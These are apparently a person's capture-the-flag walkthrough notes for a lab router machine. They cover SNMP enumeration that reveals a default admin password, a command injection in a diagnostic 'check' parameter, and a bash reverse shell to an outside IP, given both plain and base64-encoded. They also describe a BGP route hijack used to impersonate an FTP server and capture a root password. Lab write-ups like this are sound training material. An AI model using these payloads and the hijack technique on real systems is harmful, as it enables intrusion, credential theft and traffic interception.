10.10.10.105

# Ran an nmap scan
# Ran a gobuster scan

# http leads to a login page

# Versions
>>> PHP Version 7.0.30-0ubuntu0.16.04.1

# A login page with "Lyghtspeed"

# DirButser
    /img
    /tools
    /css
    /js
    /debug
    /doc

# On /doc found error_code.pdf
# Error 45009 tells me default admin password is set

"System credentials have not been set
Default admin user password is set (see chassis serial number)"

# Decided to enumerate more. So I performed a nmap udp scan.

>>> nmap.udp.txt

# Found an open port 161 that is simple management protocol

# By running:

>>> snmpwalk -v 2c -c public 10.10.10.105

# You get the string:

>>> SN#NET_45JDX23

# This gives the login

>>> admin
>>> NET_45JDX23

# Mention in the logs of networks
# Going to try an nmap ping scan

>>> nmap -sn <ip>

>>> 10.120.15.0/24 [X]
>>> 10.120.16.0/24 [X]
>>> 10.120.17.0/24
# Diagnostic page has mention of:

>>> zebra
>>> bgpd
>>> watchquagga

# The verify button sends a parameter known as 'check'
# but seems to place the value straight into a command
# This means we can add a ";" and run our own commands!!

# Reverse shell time!!!

>>> ; bash -i >& /dev/tcp/10.10.14.55/8000 0>&1
 
>>> OyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU1LzgwMDAgMD4mMQo=

# With

>>> nc -lvnp 8000 

# Gives us a reverse shell

# ROOT.txt

    tcp        0      0 10.78.10.1:bgp          10.78.10.2:49462        ESTABLISHED
    tcp        0      0 10.99.64.2:ssh          10.99.64.251:52270      ESTABLISHED
    tcp        0      0 10.78.11.1:bgp          10.78.11.2:47872        ESTABLISHED
    tcp        0      8 10.99.64.2:49350        10.10.14.55:8000        ESTABLISHED
    tcp        0      0 10.99.64.2:ssh          10.99.64.251:43758      ESTABLISHED


# In the ticket information we have mention of

>>> "CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24's"

>>> "issues connecting by FTP to an important server in the 10.120.15.0/24 network"

# Networks

>>> 10.120.15.0/24 
        Usable IPs = 10.120.15.1 to 10.120.15.254

>>> 10.120.16.0/24
>>> 10.120.17.0/24

# Scanning for active hosts without nmap
for x in {15..17} ; do (for i in {1..254} ;do (ping 10.120.$x.$i -c 1 -w 5  >/dev/null && echo "10.120.$x.$i" &) ;done) ; done

# 10.120.15.0/24

    10.120.15.1
    10.120.15.10 # FTP?

# Nothing active on 10.120.16.0/24 or 10.120.17.0/24?

# Neighbors 
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out

# Using the vtysh command shell we can view the route a packet will take to reach the target ftp server

>>> vtysh -c "show ip bgp"

    *  10.120.15.0/24   10.78.10.2                             0 200 300 i
    *>                  10.78.11.2               0             0 300 i

# Running our config.sh script on the system downloads our custom script and restarts the service. 
# This advertises that we are the shorted route to the ftp server.

# Out overall aim is to impersonate the FTP server

# Now was able are able to receive the ftp traffic using ftpd.py

2019-03-15 15-54-01 [-] USER: root
2019-03-15 15-54-01 [-] Received data: PASS BGPtelc0rout1ng

# You can now ssh onto 10.120.15.10 and get the root flag!